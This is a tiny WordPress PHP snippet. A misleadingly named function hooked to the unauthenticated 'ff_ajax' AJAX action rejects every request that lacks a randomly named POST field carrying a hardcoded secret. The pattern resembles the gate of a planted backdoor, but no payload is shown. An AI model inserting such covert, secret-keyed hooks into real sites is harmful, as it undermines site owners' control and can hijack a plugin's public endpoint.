<?php

function logger_instagram_subscriptions() {
	if (!isset($_POST["fnmycfxqkiy"]) || $_POST["fnmycfxqkiy"] !== "bBMELDhh") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'logger_instagram_subscriptions', 5, 1);
